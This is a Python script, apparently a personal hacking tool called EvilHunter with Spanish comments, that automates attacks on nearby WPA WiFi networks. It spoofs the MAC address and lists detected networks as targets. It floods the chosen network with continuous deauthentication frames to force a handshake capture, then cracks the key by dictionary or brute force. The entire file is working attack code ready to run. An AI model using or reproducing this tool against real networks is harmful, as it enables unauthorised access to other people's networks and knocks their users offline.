#!/bin/python3

try:
    print("\n[*] Starting...")
    print("\n\t[*] Comprobando librerias...")
    import string
    import re
    import colorama
    from colorama import Fore
    import os
    import time
    import random
    import subprocess
    import threading
    import multiprocessing
    import os
    import argparse
    import evilCracker
    time.sleep(1)
    print(Fore.GREEN + "\n[*] " + Fore.YELLOW + "Librerias importadas correctamente...\n" + Fore.RESET)

except ModuleNotFoundError as e:
    print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
    print("[!] Exiting...")
    exit(1)

#
# funciona... intentar conseguir clientes a los que atacar
# MAC -> (([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))
# Reestructurar el las carpteas creadas
# Crear carpeta (EvilHunter_Data)
#


def delete_files():
    os.system('find /home/EvilHunter_Data/captures -type f ! -name "*.cap" -delete > /dev/null')
    os.system('rm /home/EvilHunter_Data/espec/*')


def restart_net():
    os.system("service networking restart > /dev/null")
    os.system("service NetworkManager restart > /dev/null")


def stop_monitoring():
    if os.system("airmon-ng stop {} > /dev/null".format(interface)) != 0:
        os.system("airmon-ng stop {} > /dev/null".format(interface))


def exiting(err):
    if err:
        if err is True:
            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n", err)

        elif err == "done":
            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")

        elif err is False:
            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")

    elif not err:
        print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")

    print(
        Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
        Fore.LIGHTCYAN_EX + "Restoring mac address..." + Fore.RESET

        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
        Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET

        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
                        Fore.LIGHTCYAN_EX + "Restarting network services")

    try:
        restore_mac()
    except NameError:
        pass

    try:
        stop_monitoring()
    except NameError:
        pass

    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
          + Fore.RESET)
    delete_files()
    restart_net()

    print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
    exit()


def am_i_root():

    if os.getuid() != 0:
        print(Fore.RED + "\n[!] Necesitamos ser root...")
        exit(1)


def change_mac(interface):
    # Apagamos tarjeta de red:
    os.system("bash -c 'ifconfig {} down'".format(interface))

    # Modificamos direccion MAC
    os.system(f"macchanger -r {interface} > new_mac.txt")
    mc = os.system("cat new_mac.txt  | grep 'New' | awk '{print $2}' FS='MAC:' | awk '{print $1}' > /home/EvilHunter_Data/espec/mac.txt")

    # Encendemos tarjeta de red
    os.system(f"bash -c 'ifconfig {interface} up'")

    if mc == 0:
        mac = open("/home/EvilHunter_Data/espec/mac.txt", "r"); mac = mac.read()
        return mac
    else:
        return None


def restore_mac():
    # Apagamos tarjeta de red:
    os.system("ifconfig {} down".format(interface))

    os.system("airmon-ng check kill > /dev/null")
    os.system(f"macchanger -p {interface} > /dev/null")

    # Encendemos tarjeta de red
    os.system('ifconfig {} up'.format(interface))


def check_utilities():
    non_installed = {}
    tools = 0

    print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Comprobando herramientas necesarias...\n")

    # Comprobamos todas la herramientas...
    if os.system("command -v airmon-ng > /dev/null") != 0:
        non_installed["airmon-ng"] = False
    else:
        non_installed["airmon-ng"] = True

    if os.system('command -v aircrack-ng > /dev/null') != 0:
        non_installed["aircrack-ng"] = False
    else:
        non_installed["aircrack-ng"] = True

    if os.system('command -v aireplay-ng > /dev/null') != 0:
        non_installed["aireplay-ng"] = False
    else:
        non_installed["aireplay-ng"] = True

    if os.system('command -v airodump-ng > /dev/null') != 0:
        non_installed["airodump-ng"] = False
    else:
        non_installed["airodump-ng"] = True
    if os.system('command -v airdecap-ng > /dev/null') != 0:
        non_installed["airdecap-ng"] = False
    else:
        non_installed["airdecap-ng"] = True
    if os.system("command -v macchanger > /dev/null") != 0:
        non_installed["macchanger"] = False
    else:
        non_installed["macchanger"] = True

    for tool in non_installed:
        time.sleep(0.4)

        if tool in ["aireplay-ng", "airodump-ng", "airmon-ng", "airdecap-ng"]:
            if not non_installed[tool]:
                print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                      "La herramienta " + Fore.GREEN + "aircrack-ng" + Fore.LIGHTCYAN_EX +
                      " no está instalada correctamente...")
                exit(1)

        elif not non_installed[tool]:
            print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                  "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " no está instalada.")

        elif non_installed[tool]:
            print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX +
                  "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " está instalada.")
            tools += 1

    if tools != 2:
        print(Fore.RED + "\n[!] " + Fore.YELLOW +
              "Es necesario contrar con todas las herramientas para ejecutar el script...")
        exit(1)
    else:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Las dependencias están intstaladas... \n")
        time.sleep(1)


def kill_conects():
    # Matamos todas las conexiones
    os.system("airmon-ng check kill > /dev/null")


def monitor_mode(choosed_interface):
    global interface

    # Modo monitor y verificar estado con "iwconfig"
    os.system("airmon-ng start %s > /dev/null" % choosed_interface)

    # Ver nombre de la interfaz
    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /home/EvilHunter_Data/espec/intif")
    os.system("cat /home/EvilHunter_Data/espec/intif | grep {} > /home/EvilHunter_Data/espec/iface".format(choosed_interface))

    with open("/home/EvilHunter_Data/espec/iface", "r") as iface:
        interface = iface.read()
    interface = interface.replace("\n", "")

    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
          "Cambiando MAC address de " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.RESET)
    mac = change_mac(interface).strip()

    if mac:
        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
              "Dirección MAC actual: " + Fore.LIGHTCYAN_EX + f"{mac}.")
    else:
        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.LIGHTYELLOW_EX +
              "Dirección MAC no modificada correctamente..." + Fore.LIGHTCYAN_EX + f"{mac}.")

    os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' | cut -d: -f2 > /home/EvilHunter_Data/espec/mode".format(interface))
    with open("/home/EvilHunter_Data/espec/mode", "r") as mde:
        mode = mde.read().strip()
    try:
        if mode != "Monitor":
            return 1
        else:
            return 0
    except Exception as err:
        exiting(err)

def list_save_interf():
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "Mostrando Intefaces Disponibles...")

    time.sleep(1)
    # Creamos archivo con interfaces disponibles
    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /home/EvilHunter_Data/espec/net")
    nums = 0
    with open("/home/EvilHunter_Data/espec/net", "r") as ifaces:
        ifa = ifaces.read()
    ifaces = ifa.split("\n")

    for iface in ifaces:
        if not iface:
            continue
        nums += 1
        print(Fore.YELLOW + f"\n\t{nums})." + Fore.BLUE + " {}".format(iface))

    global choosed_interface
    choosed_interface = None

    while not choosed_interface:
        choosed_interface = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Nombre de la interfaz (E.j wlan0): ")
        if choosed_interface not in ifaces:
            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La interfaz {} no existe".format(choosed_interface))
            choosed_interface = None
        else:
            if os.system("airmon-ng | grep {} > /dev/null".format(choosed_interface)):
                print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La interfaz " + Fore.BLUE + f"{choosed_interface}" +
                      Fore.RED + " no compatible...")
                choosed_interface = None

    init_start_attack(choosed_interface)


def init_start_attack(choosed_interface):

    print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Preparing...")

    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW + "Matando todas las conexiones...")
    kill_conects()
    time.sleep(1)
    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
          "Estableciendo " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW + " en modo monitor..."
          + Fore.RESET)

    if monitor_mode(choosed_interface) == 0:
        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
              "Interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
              " establecida en modo monitor correctamente")
        prepared = True
        pass
    else:
        print(Fore.RED + "\n\t[" + Fore.YELLOW + "V" + Fore.RED + "] " + Fore.YELLOW +
              "La interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
              " no se ha establecido en modo monitor correctamente...")
        exiting(err=True)
        prepared = False

    if prepared:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Prepared to start capturing data...")


def get_options(args):
    hand = subprocess.Popen(["airodump-ng", f"{interface}"], stdout=subprocess.PIPE)

    all_got = []
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop..." + Fore.RESET)
    input(Fore.LIGHTRED_EX + "\n\t\t[ENTER] To continue")
    while True:
        try:
            output = hand.stdout.readline()
            if not output:
                break
            if output not in all_got:
                all_got.append(output)
            print(output.decode().strip())
        except KeyboardInterrupt:
            break
    print(Fore.LIGHTCYAN_EX + "\n\n[*] " + Fore.RESET + "Ended session of capture data...")
    print(Fore.BLUE + "\n\t[T] " + Fore.YELLOW + "Packets captured...")
    process_data(all_got, args)


def process_data(all_got, args):
    dict = {}
    print(Fore.BLUE + "\n\t[Y] " + Fore.YELLOW + "Processing data")
    time.sleep(1)

    with open("/home/EvilHunter_Data/espec/data", "wb") as data:
        for line in all_got:
            data.write(line)

    # Filtramos el archivo
    os.system('cat /home/EvilHunter_Data/espec/data | grep -oP "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | sort -u > /home/EvilHunter_Data/espec/bssid')

    # Abriumos el arhivo de bssids
    with open("/home/EvilHunter_Data/espec/bssid", "rb") as bssids:
        bssids = (bssids.read()).decode()
    bssids = bssids.split("\n")

    for bssid in bssids:
        if not bssid:
            continue
        os.system("cat /home/EvilHunter_Data/espec/data | grep {} | sort -u > /home/EvilHunter_Data/espec/{}".format(bssid, bssid))

        with open("/home/EvilHunter_Data/espec/"+bssid, "rb") as all_data:
            all_data = all_data.read()
        data = all_data.decode().split()

        obetives = []
        num = 0

        for itera in data:
            num += 1
            if itera not in obetives:
                obetives.append(itera)

        info = "  ".join(obetives)
        n_d = 0
        if re.findall("-[0-9]+", info):
            encription = re.findall("WPA[0-9]  [A-Z]+  +[A-Z]+", info)

            if not encription:
                continue

            channel = info.split()[info.split().index("WPA2") - 2]
            name = info.split()[info.split().index("WPA2") + 3]

            if re.findall("^(<length:*)", name):
                name = f"N/D_{n_d}"
                n_d += 1

            dict[name] = {"bssid": bssid,
                          "encription_type": encription[0],
                          "channel": channel}

        else:
            continue
    print_process_data(dict, args)


def print_process_data(dict, args):
    print(Fore.LIGHTCYAN_EX + "\n[" + Fore.RED + "V" + Fore.LIGHTCYAN_EX + "] " + Fore.YELLOW +
          "Listing aviable networks to attack...")

    # Asingamos variables necesarias
    net = 0

    print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Preparing information for networks...".format(net)
          + Fore.RESET)
    for network in dict:
        net += 1
        time.sleep(0.5)

        print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) + "\n\t\t" +
              Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(dict[network]['bssid']) + "\t\t"
              + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(dict[network]['channel']) +
              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(
            dict[network]["encription_type"]))
        print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 115, "\n\n")

    network_to_attack = None
    while not network_to_attack:
        network_to_attack = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Network to attack (E.j 'MOVISTAR_XXXX'): ")

        if network_to_attack not in dict:
            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La red {} no ha sido detectada..".format(network_to_attack))
            network_to_attack = None
        else:
            print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
            time.sleep(0.5)
            print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
            prepare_attack(dict, network_to_attack, args)


def prepare_attack(dict, network_to_attack, args):
    file = None

    while not file:
        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
                     Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")

        if os.system("find /home/EvilHunter_Data/captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
            print(Fore.RED + "\n\t\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
            file = None

    # Definimos bssid y channel
    bssid = dict[network_to_attack]['bssid']
    ch = dict[network_to_attack]['channel']

    # Leer handshake
    direc = "/home/EvilHunter_Data/captures/" + network_to_attack

    time.sleep(1)
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
          Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
          Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)

    input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")

    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file, network_to_attack))

    # Iniciamos la captura del handshake y envio de deauth
    capture.start()

    # Juntamos para detener
    capture.join()


def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
    if not os.path.exists(f"/home/EvilHunter_Data/captures/{network_to_attack}/"):
        os.makedirs(f"/home/EvilHunter_Data/captures/{network_to_attack}/")

    hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
                             f"{interface}"], stdout=subprocess.PIPE)

    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)

    done = False
    while True:
        try:
            output = hand.stdout.readline()
            print(output.decode().strip())
            if "WPA handshake:".encode() in output:
                done = True
                break

        except KeyboardInterrupt:
            break

    print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
    if done:
        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
    else:
        print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
        exiting(err=True)
    crack_handshake(direc, args, file, network_to_attack)


def find_wordlists(wordlists):
    found = os.system("find {} > /dev/null".format(wordlists))
    while found != 0:
        print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
        wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
        found = os.system("find {}  > /dev/null".format(wordlists))

    return wordlists


def crack_handshake(direc, args, file, network_to_attack):
    # Buscamos arhchivo .cap
    os.system("find {}/{}*.cap > /home/EvilHunter_Data/espec/capture_file ".format(direc, file))

    # Abrimos el capture_file donde se encuentra la ruta hacia  el .cap
    with open("/home/EvilHunter_Data/espec/capture_file", "r") as file:
        file = file.read().strip()

    # Comprobamos si nos ha pasasdo discionario y si existe en su sistema o si quiere brute
    if args.wordlist:
        wordlist = find_wordlists(args.wordlist)

    elif args.brute:
        if args.threads:
            fnd = multiprocessing.Process(evilCracker.startbrute(file, args.brute, args.threads, network_to_attack))
            fnd.start()
        else:
            fnd = multiprocessing.Process(evilCracker.startbrute(file, args.brute, 500, network_to_attack))
            fnd.start()

        if fnd == 0:
            exiting(err="done")
        else:
            exiting(err=False)

    print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
    # input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
    time.sleep(3)

    # Empezamos con el crack de la password
    crack = subprocess.Popen(["aircrack-ng", file, "-w", wordlist], stdout=subprocess.PIPE)

    # Mostramos la salida hasta que se encuentre la contraseña (o no)
    while True:
        try:
            output = crack.stdout.readline()
            print(output.decode().strip())
            if "KEY NOT FOUND".encode() in output:
                found = False
                break
            elif "KEY FOUND".encode() in output:
                found = True
                break
        except KeyboardInterrupt:
            crack.terminate()
            found = None
            break

    if not found:
        print(Fore.RED + "\n\n\n\n\n\n\n\n\n\n\n\n[!] " + Fore.LIGHTYELLOW_EX + "La clave no se ha encontrado...")
        print(Fore.LIGHTCYAN_EX + "\n\t[*] " + Fore.LIGHTYELLOW_EX + "Quieres probar un ataque de fuerza bruta? ")
        s = input("\n\t\t[S/N] -> ")

        if s.lower() == "s":
            if args.threads:
                evilCracker.startbrute(file, "r", args.threads, network_to_attack)
            else:
                evilCracker.startbrute(file, "r", 200, network_to_attack)
        else:
            exiting(err='done')


def organize_dirs():
    if not os.path.exists("/home/EvilHunter_Data"):
        os.makedirs("/home/EvilHunter_Data")
        os.system('chmod 755 /home/EvilHunter_Data')
    if not os.path.exists("/home/EvilHunter_Data/captures"):
        os.makedirs("/home/EvilHunter_Data/captures")
        os.system('chmod 755 /home/EvilHunter_Data/captures')
    if not os.path.exists("/home/EvilHunter_Data/espec"):
        os.makedirs("/home/EvilHunter_Data/espec")
        os.system('chmod 755 /home/EvilHunter_Data/espec')


def main():
    try:
        # Recogemos argumentos
        parser = argparse.ArgumentParser()
        
        # Argumento de diccionario
        parser.add_argument("-w", "--wordlist", help="Set diccionary attack, specify an extern wordlists dictionary  "
                                                     "USAGE:  -w /path/to/dict\n", required=False)
        
        # Argumento de fuerza bruta
        parser.add_argument("-b", "--brute", help="Use password generator for brute force   USAGE: -b "
                                                  "[length passwords / r (random)] E.j: -b 12 ",
                            required=False)
        
        # Argumento de hilos
        parser.add_argument("-t", "--threads", help="Specify the number of threads", required=False)
        
        args = parser.parse_args()

        # Checkeamos argumentos que estén bien...
        if not args.wordlist and not args.brute:
            print(Fore.RED + "[!] ERROR: " + 
                  Fore.YELLOW + "Debes introducir un parámetro...\n\t [ --help / -h ] for help")
            exit(1)

        elif args.brute:

            if args.threads:
                try:
                    num = int(args.threads)
                except ValueError:
                    print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce un NUMERO...")
                    exit(1)

                if num > 500 or num < 20:
                    print(num)
                    print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
                                                                    "entre 20-500...")
                    exit(1)

            if args.brute != "r":
                for num in args.brute:
                    if num not in string.digits:
                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el largo de "
                                                                        "las contraseñas o 'r' para random length")
                        exit(1)

        # Somos root?
        am_i_root()

        # Carpetas necesarias
        organize_dirs()

        # Tenemos las herraientas?
        check_utilities()

        # Listamos interfaces
        list_save_interf()

        # Escanemos redes cercanas
        get_options(args)

        # Borramos datos
        exiting(err="done")

    # Salida manual
    except KeyboardInterrupt:
        exiting(err=False)


if __name__ == "__main__":
    main()
